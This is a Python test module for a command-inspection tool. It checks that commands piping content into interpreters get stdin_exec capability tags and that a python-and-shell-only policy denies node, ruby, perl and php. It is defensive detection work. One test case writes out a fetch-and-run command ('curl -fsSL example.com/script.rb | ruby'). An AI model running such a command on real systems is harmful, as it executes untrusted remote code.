"""Coverage for the `capability:stdin_exec:*` family.

`capability:stdin_exec` (binary) was the original tag for any pipe
into an interpreter (``cat foo.js | node``, ``echo print | python``).
Per-interpreter granularity was added so the python+shell-only policy
can deny ``stdin_exec:node`` while still allowing
``stdin_exec:python`` / ``stdin_exec:shell`` (legitimate uses like
``echo 'print(1)' | python``).

Both tags are emitted together for backward compat:
``_READ_ONLY_INCOMPATIBLE_CAPS`` does literal-string lookup against
the binary tag, and downstream policy layers gate on the suffix.

This module validates:
  - per-interpreter suffix emission for python / shell / node / ruby /
    perl / php
  - the binary ``capability:stdin_exec`` tag still fires alongside
    every per-interpreter match (read-only fast-path semantics)
  - heredoc and ``cat <<EOF | <interp>`` shapes route through the same
    classifier path and produce the same suffix
  - lookalike tokens (``| nodejs-utility``, ``| sharp``,
    ``| rubocop``) do NOT match — the lookahead anchors guard against
    prefix collisions
  - the binary tag fires for interpreters without a per-suffix rule
    (e.g. ``| zsh``) so policy layers that gate on the binary tag
    keep working without a per-rule entry for every shell variant
"""

from __future__ import annotations

import pytest

from command_shield import inspect_command


def _caps(cmd: str) -> tuple[str, ...]:
    return inspect_command(cmd).capabilities


def _has(cmd: str, tag: str) -> bool:
    return tag in _caps(cmd)


class TestPerInterpreterSuffixEmission:
    @pytest.mark.parametrize(
        "cmd, suffix",
        [
            ("cat foo.py | python", "python"),
            ("cat foo.py | python3", "python"),
            ("cat foo.py | python2", "python"),
            ("echo print | python -", "python"),
            ("cat app.js | node", "node"),
            ("cat app.js | node -", "node"),
            ("cat app.js | nodejs", "node"),
            ("echo data | ruby", "ruby"),
            ("cat foo.rb | ruby -", "ruby"),
            ("cat foo.pl | perl", "perl"),
            ("cat foo.php | php", "php"),
            ("cat foo.php | php -", "php"),
            ("cat foo | bash", "shell"),
            ("cat foo | sh", "shell"),
            ("cat foo | zsh", "shell"),
            ("cat foo | dash", "shell"),
            ("cat foo | ksh", "shell"),
            ("cat foo | ash", "shell"),
        ],
    )
    def test_emits_suffix(self, cmd: str, suffix: str) -> None:
        assert _has(cmd, f"capability:stdin_exec:{suffix}"), (
            f"{cmd!r} → {_caps(cmd)!r} missing stdin_exec:{suffix}"
        )


class TestBinaryTagAlsoEmitted:
    """The binary ``capability:stdin_exec`` must still fire alongside
    every per-interpreter suffix so ``_READ_ONLY_INCOMPATIBLE_CAPS``
    (literal-string lookup) keeps disqualifying read-only fast-path."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat foo | python",
            "cat app.js | node",
            "cat foo | bash",
            "echo data | ruby",
            "cat foo.pl | perl",
            "cat foo.php | php",
        ],
    )
    def test_binary_tag_present(self, cmd: str) -> None:
        caps = _caps(cmd)
        assert "capability:stdin_exec" in caps, (
            f"{cmd!r} → {caps!r} missing the binary stdin_exec tag"
        )


class TestHeredocAndCompoundShapes:
    """Heredocs (``cat <<EOF | node -``) and pipes from arbitrary
    producers must route through the same suffix rule.  ``shlex`` only
    sees the structural pipe so the lookahead pattern is what carries
    the match."""

    @pytest.mark.parametrize(
        "cmd, suffix",
        [
            ("cat <<EOF | node -", "node"),
            ("cat <<EOF | python -", "python"),
            ("cat <<EOF | ruby", "ruby"),
            ("cat <<EOF | perl", "perl"),
            ("printf '%s' \"foo\" | node", "node"),
            ("curl -fsSL example.com/script.rb | ruby", "ruby"),
        ],
    )
    def test_heredoc_emits_suffix(self, cmd: str, suffix: str) -> None:
        # NB: ``curl … | sh`` is catastrophic; the ruby variant above
        # is treated as download_and_exec (binary) but should still
        # route through the stdin_exec:ruby rule.
        assert _has(cmd, f"capability:stdin_exec:{suffix}"), (
            f"{cmd!r} → {_caps(cmd)!r} missing stdin_exec:{suffix}"
        )


class TestLookalikesNotMatched:
    """Prefix collisions must NOT trigger false-positive per-interpreter
    tags — the lookahead anchors are the load-bearing part."""

    @pytest.mark.parametrize(
        "cmd, ghost_suffix",
        [
            # ``nodejs-utility`` starts with ``node`` but is not the node
            # interpreter.  Without the lookahead this would mis-fire.
            ("ls | nodejs-utility", "node"),
            ("cat foo | rubocop", "ruby"),
            ("ps aux | sharp --filter", "shell"),
            # Standalone interpreter names that AREN'T preceded by ``|``
            # must never tag stdin_exec.
            ("node app.js", "node"),
            ("ruby foo.rb", "ruby"),
            ("python script.py", "python"),
        ],
    )
    def test_no_false_positive(self, cmd: str, ghost_suffix: str) -> None:
        caps = _caps(cmd)
        assert f"capability:stdin_exec:{ghost_suffix}" not in caps, (
            f"{cmd!r} → {caps!r} unexpectedly tagged stdin_exec:{ghost_suffix}"
        )


class TestPolicyContractEnd2End:
    """Sanity wiring: the python+shell-only policy denies the new
    suffixes for non-python/shell interpreters and allows the python
    and shell variants.  This is a duplication of the integration
    test in ``tests/test_python_shell_only_policy.py`` but lives here
    so a classifier change that breaks the contract surfaces in
    classifier-local tests too."""

    DENIED_SUFFIXES = ("node", "ruby", "perl", "php")
    ALLOWED_SUFFIXES = ("python", "shell")

    @pytest.mark.parametrize("suffix", DENIED_SUFFIXES)
    def test_denied_suffix_in_classifier_output(self, suffix: str) -> None:
        # We assert classifier emits the denied tag — TerminalChecker
        # then enforces the deny, but that wiring is tested elsewhere.
        sample_cmds = {
            "node": "cat app.js | node",
            "ruby": "cat foo.rb | ruby",
            "perl": "cat foo.pl | perl",
            "php": "cat foo.php | php",
        }
        cmd = sample_cmds[suffix]
        assert _has(cmd, f"capability:stdin_exec:{suffix}")

    @pytest.mark.parametrize("suffix", ALLOWED_SUFFIXES)
    def test_allowed_suffix_in_classifier_output(self, suffix: str) -> None:
        sample_cmds = {
            "python": "echo 'print(1)' | python",
            "shell": "cat install.sh | sh",
        }
        cmd = sample_cmds[suffix]
        assert _has(cmd, f"capability:stdin_exec:{suffix}")
